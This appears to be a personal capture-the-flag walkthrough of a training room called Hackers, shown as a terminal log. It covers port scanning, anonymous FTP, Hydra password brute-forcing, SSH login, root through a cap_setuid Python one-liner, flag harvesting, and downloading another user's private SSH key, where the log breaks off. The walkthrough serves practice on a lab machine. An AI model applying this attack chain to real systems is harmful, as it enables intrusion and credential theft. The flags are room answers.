----
The Hackers KoTH box, to allow you to practice alone!
----


### Task 1  Capture the flags

 Start Machine

Capture the flags. Defend Ellingson Mineral.

This is a standalone room for one of the King of the Hill machines, Hackers.  
You can access the official writeup by clicking Options (top right) and then 'Writeups'.

This box was from the May 2020 KoTH rotation. It **awards no points**, as the current question system doesn't allow me to do this in a reasonable fashion.  

Answer the questions below

```
┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.0.27 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.0.27:21
Open 10.10.0.27:22
Open 10.10.0.27:80
Open 10.10.0.27:9999
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 16:06 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:06
Completed NSE at 16:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:06
Completed NSE at 16:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:06
Completed NSE at 16:06, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:06
Completed Parallel DNS resolution of 1 host. at 16:06, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:06
Scanning 10.10.0.27 [4 ports]
Discovered open port 21/tcp on 10.10.0.27
Discovered open port 22/tcp on 10.10.0.27
Discovered open port 80/tcp on 10.10.0.27
Discovered open port 9999/tcp on 10.10.0.27
Completed Connect Scan at 16:06, 0.37s elapsed (4 total ports)
Initiating Service scan at 16:06
Scanning 4 services on 10.10.0.27
Completed Service scan at 16:07, 98.14s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.0.27.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:07
NSE: [ftp-bounce 10.10.0.27:21] PORT response: 500 Illegal PORT command.
Completed NSE at 16:08, 9.66s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:08
Completed NSE at 16:08, 2.57s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:08
Completed NSE at 16:08, 0.00s elapsed
Nmap scan report for 10.10.0.27
Host is up, received user-set (0.37s latency).
Scanned at 2023-07-08 16:06:15 EDT for 111s

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ffeab0583579dfb3c157014309be2ad5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC85H7NSfWQ5R3+cBO6BD5S4WUxD7qvMEDIo1bPEFH38U0sh4iiOBzRPgfZR2LxHUnYvxEiky8Zra0kKxYODy/IsvVorp2Xj2zDCEA/nlnAnrFJOCh660JrbPRxa9TBhHMYWrz/E8OiODSoFdNNq7FIVDm5zThnguTZlOxnA2XcAN82KZXqmWVD4fkhaKnCaKW6Fi8wnQFy7qMDDryD82iafNKXHLgjxTAaiyesDIQgXy6CdsUEDwBuD2X8UC2719dQ2Al98HJwxIE8AlV2sr8PFr0xMajqCO6tbvEQre5uOnt+Az8xhCduQe60ObSM8ZCHonEMBHG2LoFKM3UBN5cT
|   256 3bff4a884fdc0331b69bddea6985b0af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBU7HJrYYZyyJqnGFzBLWfHJc2thoP6xyqY2NPfkUqzv4OlVQM/1pGN9584Ux703JSqO5RryvZprS4jS5KCA194=
|   256 fafd4c0a03b6f71ceef83343dcb47541 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPdk38OXDLUEHN/TX+U0QAOOlHUprNXfSM5D/T+vMF3b
80/tcp   open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Ellingson Mineral Company
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9999/tcp open  abyss?  syn-ack
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 08 Jul 2023 20:06:23 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 08 Jul 2023 20:06:22 GMT
|     Content-Length: 1
|_    Content-Type: text/plain; charset=utf-8
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.93%I=7%D=7/8%Time=64A9C1BE%P=x86_64-pc-linux-gnu%r(Get
SF:Request,75,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2008\x20Jul\x20202
SF:3\x2020:06:22\x20GMT\r\nContent-Length:\x201\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\n\r\n\n")%r(HTTPOptions,75,"HTTP/1\.0\x20200\x
SF:20OK\r\nDate:\x20Sat,\x2008\x20Jul\x202023\x2020:06:23\x20GMT\r\nConten
SF:t-Length:\x201\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n
SF:\n")%r(FourOhFourRequest,75,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2
SF:008\x20Jul\x202023\x2020:06:23\x20GMT\r\nContent-Length:\x201\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n\n")%r(GenericLines,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(R
SF:TSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessi
SF:onReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charse
SF:t=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: Ellingson; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:08
Completed NSE at 16:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:08
Completed NSE at 16:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:08
Completed NSE at 16:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.59 seconds


┌──(witty㉿kali)-[~/hackers_koth]
└─$ ftp 10.10.0.27   
Connected to 10.10.0.27.
220-Ellingson Mineral Company FTP Server
220-
220-WARNING
220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986
220 
Name (10.10.0.27:witty): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||64507|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Apr 30  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Apr 30  2020 ..
-rw-r--r--    1 ftp      ftp            38 Apr 30  2020 .flag
-rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
226 Directory send OK.
ftp> type .flag
.flag: unknown mode.
ftp> mget *
mget note [anpqy?]? yes
229 Entering Extended Passive Mode (|||18452|)
150 Opening BINARY mode data connection for note (400 bytes).
100% |****************************************|   400        1.58 MiB/s    00:00 ETA
226 Transfer complete.
400 bytes received in 00:00 (1.49 KiB/s)
ftp> get .flag
local: .flag remote: .flag
229 Entering Extended Passive Mode (|||29089|)
150 Opening BINARY mode data connection for .flag (38 bytes).
100% |****************************************|    38      311.84 KiB/s    00:00 ETA
226 Transfer complete.
38 bytes received in 00:00 (0.11 KiB/s)
ftp> exit
221 Goodbye.

┌──(witty㉿kali)-[~/hackers_koth]
└─$ cat .flag      
thm{678d0231fb4e2150afc1c4e336fcf44d}


┌──(witty㉿kali)-[~/hackers_koth]
└─$ cat note       
Note:
Any users with passwords in this list:
love
sex
god
secret
will be subject to an immediate disciplinary hearing.
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company's cryptographic keys is a disciplinary offense.
Eugene Belford, CSO

rcampbell, gcrawford -- users

┌──(witty㉿kali)-[~/hackers_koth]
└─$ hydra -l rcampbell -P /usr/share/wordlists/rockyou.txt 10.10.0.27 ftp -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-08 16:09:25
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://10.10.0.27:21/
[STATUS] 714.00 tries/min, 714 tries in 00:01h, 14343699 to do in 334:50h, 50 active
[21][ftp] host: 10.10.0.27   login: rcampbell   password: mylife
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 14 final worker threads did not complete until end.
[ERROR] 14 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-08 16:10:52


http://10.10.0.27/robots.txt

Skiddies keep out.
Any unauthorised access will be forwarded straight to Richard McGill FBI and you WILL be arrested.
- plague  -- user

┌──(witty㉿kali)-[~]
└─$ gobuster -t 64 dir -e -k -u http://10.10.0.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.27/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/08 16:10:45 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.0.27/img                  (Status: 301) [Size: 0] [--> img/]
http://10.10.0.27/news                 (Status: 301) [Size: 0] [--> news/]
http://10.10.0.27/contact              (Status: 301) [Size: 0] [--> contact/]
http://10.10.0.27/staff                (Status: 301) [Size: 0] [--> staff/]
http://10.10.0.27/backdoor             (Status: 301) [Size: 0] [--> backdoor/]
http://10.10.0.27/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]

A backdoor found username plague

┌──(witty㉿kali)-[~]
└─$ ssh rcampbell@10.10.0.27        
The authenticity of host '10.10.0.27 (10.10.0.27)' can't be established.
ED25519 key fingerprint is SHA256:h5AEIGHsr8ICezAIclTEDV4ACuGkC/SeSi9Gb2Rik1g.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:65: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.27' (ED25519) to the list of known hosts.
Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986
rcampbell@10.10.0.27's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

rcampbell@gibson:~$ id
uid=1002(rcampbell) gid=1002(rcampbell) groups=1002(rcampbell)
rcampbell@gibson:~$ ls -lah
total 32K
drwxr-x--- 4 rcampbell rcampbell 4.0K Jul  8 20:14 .
drwxr-xr-x 6 root      root      4.0K Apr 29  2020 ..
lrwxrwxrwx 1 rcampbell rcampbell    9 Apr 30  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rcampbell rcampbell  220 Apr 29  2020 .bash_logout
-rw-r--r-- 1 rcampbell rcampbell 3.7K Apr 29  2020 .bashrc
drwx------ 2 rcampbell rcampbell 4.0K Jul  8 20:14 .cache
-r-------- 1 rcampbell rcampbell   38 Apr 30  2020 .flag
drwx------ 3 rcampbell rcampbell 4.0K Jul  8 20:14 .gnupg
-rw-r--r-- 1 rcampbell rcampbell  807 Apr 29  2020 .profile
rcampbell@gibson:~$ cat .flag
thm{12361ad240fec43005844016092f1e05}
rcampbell@gibson:~$ sudo -l
[sudo] password for rcampbell:       
Sorry, user rcampbell may not run sudo on gibson.
rcampbell@gibson:~$ getcap -r / 2>/dev/null
/usr/bin/python3.6 = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
rcampbell@gibson:~$ /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1002(rcampbell) groups=1002(rcampbell)
# cd /root
# ls
king.txt  koth
# ls -lah
total 6.4M
drwx------  4 root root 4.0K Apr 30  2020 .
drwxr-xr-x 24 root root 4.0K Jul  8 19:51 ..
lrwxrwxrwx  1 root root    9 Apr 30  2020 .bash_history -> /dev/null
-rw-------  1 root root 3.1K Apr  9  2018 .bashrc
-rw-r--r--  1 root root   38 Apr 30  2020 .flag
-rw-r--r--  1 root root    1 Apr 30  2020 king.txt
-rwxr-xr-x  1 root root 6.3M Apr 30  2020 koth
drwxr-xr-x  3 root root 4.0K Apr 29  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Apr 30  2020 .selected_editor
drwx------  2 root root 4.0K Apr 26  2020 .ssh
# cat .flag
thm{b94f8d2e715973f8bc75fe099c8492c4}
# lsattr king.txt
--------------e--- king.txt
# echo "WittyAle" > king.txt
# chattr +ia king.txt
/bin/sh: 8: chattr: not found
# which chattr
# lsattr king.txt
--------------e--- king.txt
# tty
/dev/pts/0
# w
 20:28:23 up 39 min,  1 user,  load average: 22.30, 15.84, 8.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
rcampbel pts/0    10.8.19.103      20:14    1.00s  0.35s  0.01s sshd: rcampbel

# find / -type f -name *flag 2>/dev/null
/root/.flag
/home/tryhackme/.flag
/home/production/.flag
/home/rcampbell/.flag
/var/ftp/.flag
# cat /home/tryhackme/.flag
thm{3ce2fe64055d3b543360c3fc880194f8}
# cat /home/production/.flag
thm{879f3238fb0a4bf1c23fd82032d237ff}
# cat /var/ftp/.flag
thm{678d0231fb4e2150afc1c4e336fcf44d}

# grep -iRl "thm" /home/production 2>/dev/null
/home/production/webserver/server
/home/production/webserver/resources/main.css
/home/production/.flag

# cat /home/production/webserver/resources/main.css
/* Curious one, aren't you? Have a flag. thm{b63670f7192689782a45d8044c63197f}*/

# grep -iRl "thm" /home/gcrawford 2>/dev/null
/home/gcrawford/business.txt
# cat /home/gcrawford/business.txt
Remember to send the accounts to Rich by 5pm Friday.

Remember to change my password, before the meeting with Mr Belford.
I hope he doesn't fire me. I need to provide for my family
I need to send Ben the flag too, thm{d8deb5f0526ec81f784ce68e641cde40}

# grep -iRl "thm{" /etc/ 2>/dev/null
/etc/vsftpd.conf
/etc/ssh/sshd_config
# cat /etc/vsftpd.conf
# Example config file /etc/vsftpd.conf
#
# The default compiled in settings are fairly paranoid. This sample file
# loosens things up a bit, to make the ftp daemon more usable.
# Please see vsftpd.conf.5 for all compiled in defaults.
#
# READ THIS: This example file is NOT an exhaustive list of vsftpd options.
# Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd's
# capabilities.
#
#
# Run standalone?  vsftpd can run either from an inetd or as a standalone
# daemon started from an initscript.
listen=NO
#
# This directive enables listening on IPv6 sockets. By default, listening
# on the IPv6 "any" address (::) will accept connections from both IPv6
# and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6
# sockets. If you want that (perhaps because you want to listen on specific
# addresses) then you must run two copies of vsftpd with two configuration
# files.
listen_ipv6=YES
#
# Allow anonymous FTP? (Disabled by default).
anonymous_enable=YES
#
# Uncomment this to allow local users to log in.
local_enable=YES
#
# Uncomment this to enable any form of FTP write command.
#write_enable=YES
#
# Default umask for local users is 077. You may wish to change this to 022,
# if your users expect that (022 is used by most other ftpd's)
local_umask=022
#
# Uncomment this to allow the anonymous FTP user to upload files. This only
# has an effect if the above global write enable is activated. Also, you will
# obviously need to create a directory writable by the FTP user.
#anon_upload_enable=YES
#
# Uncomment this if you want the anonymous FTP user to be able to create
# new directories.
#anon_mkdir_write_enable=YES
#
# Activate directory messages - messages given to remote users when they
# go into a certain directory.
dirmessage_enable=YES
#
# If enabled, vsftpd will display directory listings with the time
# in  your  local  time  zone.  The default is to display GMT. The
# times returned by the MDTM FTP command are also affected by this
# option.
use_localtime=YES
#
# Activate logging of uploads/downloads.
xferlog_enable=YES
#
# Make sure PORT transfer connections originate from port 20 (ftp-data).
connect_from_port_20=YES
#
# If you want, you can arrange for uploaded anonymous files to be owned by
# a different user. Note! Using "root" for uploaded files is not
# recommended!
#chown_uploads=YES
#chown_username=whoever
#
# You may override where the log file goes if you like. The default is shown
# below.
#xferlog_file=/var/log/vsftpd.log
#
# If you want, you can have your log file in standard ftpd xferlog format.
# Note that the default log file location is /var/log/xferlog in this case.
#xferlog_std_format=YES
#
# You may change the default value for timing out an idle session.
#idle_session_timeout=600
#
# You may change the default value for timing out a data connection.
#data_connection_timeout=120
#
# It is recommended that you define on your system a unique user which the
# ftp server can use as a totally isolated and unprivileged user.
#nopriv_user=ftpsecure
#
# Enable this and the server will recognise asynchronous ABOR requests. Not
# recommended for security (the code is non-trivial). Not enabling it,
# however, may confuse older FTP clients.
#async_abor_enable=YES
#
# By default the server will pretend to allow ASCII mode but in fact ignore
# the request. Turn on the below options to have the server actually do ASCII
# mangling on files when in ASCII mode.
# Beware that on some FTP servers, ASCII support allows a denial of service
# attack (DoS) via the command "SIZE /big/file" in ASCII mode. vsftpd
# predicted this attack and has always been safe, reporting the size of the
# raw file.
# ASCII mangling is a horrible feature of the protocol.
#ascii_upload_enable=YES
#ascii_download_enable=YES
#
# You may fully customise the login banner string:
banner_file=/etc/vsftpd/banner
#
# You may specify a file of disallowed anonymous e-mail addresses. Apparently
# useful for combatting certain DoS attacks.
#deny_email_enable=YES
# (default follows)
#banned_email_file=/etc/vsftpd.banned_emails
#
# You may restrict local users to their home directories.  See the FAQ for
# the possible risks in this before using chroot_local_user or
# chroot_list_enable below.
chroot_local_user=YES
allow_writeable_chroot=YES
#
# You may specify an explicit list of local users to chroot() to their home
# directory. If chroot_local_user is YES, then this list becomes a list of
# users to NOT chroot().
# (Warning! chroot'ing can be very dangerous. If using chroot, make sure that
# the user does not have write access to the top level directory within the
# chroot)
#chroot_local_user=YES
#chroot_list_enable=YES
# (default follows)
#chroot_list_file=/etc/vsftpd.chroot_list
#
# You may activate the "-R" option to the builtin ls. This is disabled by
# default to avoid remote users being able to cause excessive I/O on large
# sites. However, some broken FTP clients such as "ncftp" and "mirror" assume
# the presence of the "-R" option, so there is a strong case for enabling it.
#ls_recurse_enable=YES
#
# Customization
#
# Some of vsftpd's settings don't fit the filesystem layout by
# default.
#
# This option should be the name of a directory which is empty.  Also, the
# directory should not be writable by the ftp user. This directory is used
# as a secure chroot() jail at times vsftpd does not require filesystem
# access.
secure_chroot_dir=/var/run/vsftpd/empty
#
# This string is the name of the PAM service vsftpd will use.
pam_service_name=vsftpd
#
# This option specifies the location of the RSA certificate to use for SSL
# encrypted connections.
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
ssl_enable=NO

# thm{2124a8091b664c98a0e5bdbb7a4fa1cb}
# Uncomment this to indicate that vsftpd use a utf8 filesystem.
#utf8_filesystem=YES
anon_root=/var/ftp
hide_ids=YES

# cat /etc/ssh/sshd_config
#	$OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.
# thm{068754683abe0bf81fb621ce55a91964}

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#UseLogin no
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
Banner /etc/ssh/ssh_banner

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem sftp	/usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server
PasswordAuthentication yes

Match User gcrawford
	PasswordAuthentication no

┌──(witty㉿kali)-[~/hackers_koth]
└─$ hydra -l gcrawford -P /usr/share/wordlists/rockyou.txt 10.10.0.27 ftp -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-08 16:11:31
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://10.10.0.27:21/
[STATUS] 774.00 tries/min, 774 tries in 00:01h, 14343639 to do in 308:52h, 50 active
[STATUS] 729.67 tries/min, 2189 tries in 00:03h, 14342224 to do in 327:36h, 50 active
[STATUS] 721.71 tries/min, 5052 tries in 00:07h, 14339361 to do in 331:09h, 50 active
[STATUS] 631.67 tries/min, 9475 tries in 00:15h, 14334938 to do in 378:14h, 50 active
[STATUS] 466.77 tries/min, 14470 tries in 00:31h, 14329943 to do in 511:40h, 50 active
[21][ftp] host: 10.10.0.27   login: gcrawford   password: cayank
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 14 final worker threads did not complete until end.
[ERROR] 14 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-08 16:47:59

┌──(witty㉿kali)-[~/hackers_koth]
└─$ ftp 10.10.0.27
Connected to 10.10.0.27.
220-Ellingson Mineral Company FTP Server
220-
220-WARNING
220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986
220 
Name (10.10.0.27:witty): gcrawford
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||61823|)
150 Here comes the directory listing.
drwxr-x---    6 ftp      ftp          4096 Apr 30  2020 .
drwxr-x---    6 ftp      ftp          4096 Apr 30  2020 ..
lrwxrwxrwx    1 ftp      ftp             9 Apr 30  2020 .bash_history -> /dev/null
-rw-r--r--    1 ftp      ftp           220 Apr 29  2020 .bash_logout
-rw-r--r--    1 ftp      ftp          3771 Apr 29  2020 .bashrc
drwx------    2 ftp      ftp          4096 Apr 29  2020 .cache
drwx------    3 ftp      ftp          4096 Apr 29  2020 .gnupg
drwxrwxr-x    3 ftp      ftp          4096 Apr 29  2020 .local
-rw-r--r--    1 ftp      ftp           807 Apr 29  2020 .profile
drwx------    2 ftp      ftp          4096 Jul 08 19:51 .ssh
-r--------    1 ftp      ftp           252 Apr 30  2020 business.txt
226 Directory send OK.
ftp> cd .ssh
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||31407|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           398 Jul 08 19:51 authorized_keys
-rw-------    1 ftp      ftp          1766 Jul 08 19:51 id_rsa
-rw-r--r--    1 ftp      ftp           398 Jul 08 19:51 id_rsa.pub
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||59043|)
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
